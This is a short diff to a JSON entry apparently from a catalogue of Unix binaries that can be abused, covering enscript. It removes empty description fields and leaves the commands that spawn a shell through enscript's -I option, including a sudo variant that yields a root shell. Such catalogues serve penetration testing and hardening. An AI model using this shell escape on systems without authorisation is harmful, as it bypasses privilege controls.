@@ -2,13 +2,13 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'\n"
       }
     ]
